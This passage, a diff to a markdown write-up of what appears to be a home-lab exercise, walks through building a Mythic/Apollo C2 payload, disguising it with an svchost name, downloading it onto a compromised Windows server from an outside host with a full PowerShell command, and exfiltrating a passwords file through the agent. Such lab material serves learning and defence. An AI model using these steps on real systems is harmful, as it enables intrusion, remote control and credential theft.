@@ -49,8 +49,40 @@ We're going to be using the Apollo agent for our purposes. We can install it usi
 <p align="center"><i>Ref 6: Apollo now appears within our web GUI under "C2 profiles and payload types."</i></p>
 <br>
 
+Now, we can install a C2 profile. What is a C2 profile? A C2 profile provides a way to get messages off the wire and forward them to the Mythic server. In our case, we'll use the HTTP profile.
 
+<p align="center"><img src="https://i.imgur.com/9FGS1kR.png"></p>
+<p align="center"><i>Ref 7: Our HTTP C2 profile has been installed.</i></p>
+<br>
 
+Now how do we create a payload? Easy, just select the hazard icon at the top and make a new payload. We want the C2 profile to call back to our Mythic server, so we'll modify the callback host to be `http://207.148.3.13`.
+
+<p align="center"><img src="https://i.imgur.com/Wr5zoYm.png"></p>
+<p align="center"><i>Ref 8: Configuring our C2 profile.</i></p>
+<br>
+
+Now that we've made the payload and it's ready to download, we'll grab that download link and use `wget` to download it to our server.
+
+<p align="center"><img src="https://i.imgur.com/CXR5uKH.png"></p>
+<p align="center"><i>Ref 9: I've downloaded the payload onto our Mythic server, and I've renamed it so it looks less conspicuous.</i></p>
+<br>
+
+Cool! I made a directory called `1` and moved our new executable into there. Then, I started an HTTP server using Python with the `python3 -m http.server 9999` command on our Mythic server. Now that we're running that HTTP server, we can download the payload executable onto the compromised Windows server from our HTTP server by running `Invoke-WebRequest -Uri http://207.148.3.13:9999/svchost-dsuyu.exe -OutFile "C:\Users\Public\Downloads\svchost-dsuyu.exe"` from Windows PowerShell via our RDP connection to the Windows server.
+
+<p align="center"><img src="https://i.imgur.com/VvBCRh3.png"></p>
+<p align="center"><i>Ref 10: Downloading the payload onto our Windows server so we can establish a command and control connection.</i></p>
+<br>
+
+In other words, the command downloads the executable from our remote Mythic server. Executing the file means we're now receiving callbacks from our agent to our Mythic server. Effectively, the Windows machine is totally pwned and it's all over from here. Now, using our web GUI, we can run commands such as `ifconfig`, `whoami`, and most importantly, `download`. We're going to download that `passwords.txt` file we made earlier.
+
+<p align="center"><img src="https://i.imgur.com/fZKlLww.png"></p>
+<p align="center"><i>Ref 11: Within our C2 profile configuration, I enabled a few commands that we'd be able to run once we started receiving callbacks. Here, I'm running those commands.</i></p>
+<br>
+
+Notably, there were a few ports we had to open to make this all work out. For example, we had to open port 80 on our Mythic server so that the two servers could actually communicate over HTTP. I also allowed port 9999 on our Mythic server. Like before, we have to make firewall rules not only for the Vultr firewalls but also for our server firewalls.
+
+## Summary
+In this section, I conducted my own brute force attack using Kali Linux and Crowbar, RDP'd into the compromised Windows server, and installed my Mythic agent along with a Mythic server. Using the Mythic server, I was able to run an HTTP server using Python so that I could install the payload from within my Windows server. Once the payload was installed and running, I could use the Mythic web GUI to run commands. I established a command and control connection thanks to the Apollo agent and HTTP C2 profile.
 
 
 
